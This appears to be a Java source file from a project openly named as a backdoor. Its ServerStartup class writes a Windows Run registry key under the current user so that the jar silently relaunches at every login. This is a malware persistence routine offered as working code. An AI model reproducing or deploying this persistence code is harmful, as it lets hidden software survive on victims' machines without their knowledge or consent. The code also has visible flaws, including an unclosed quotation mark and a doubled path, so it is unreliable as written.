package com.github.pulsebeat02.backdoor;

import java.io.UnsupportedEncodingException;
import java.lang.reflect.InvocationTargetException;
import java.net.URLDecoder;

public class ServerStartup {

  public ServerStartup() {
  }

  public void addRegistry() {
    try {
      WinRegistry.writeStringValue(
          WinRegistry.HKEY_CURRENT_USER,
          "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
          "jar autorun key",
              "\"javaw -jar " + System.getProperty("user.dir") + getCurrentPath());
    } catch (final IllegalAccessException | InvocationTargetException e) {
      e.printStackTrace();
    }
  }

  private String getCurrentPath() {
    final String path = ServerStartup.class.getProtectionDomain().getCodeSource().getLocation().getPath();
    try {
      return URLDecoder.decode(path, "UTF-8");
    } catch (final UnsupportedEncodingException e) {
      e.printStackTrace();
    }
    return "";
  }

}
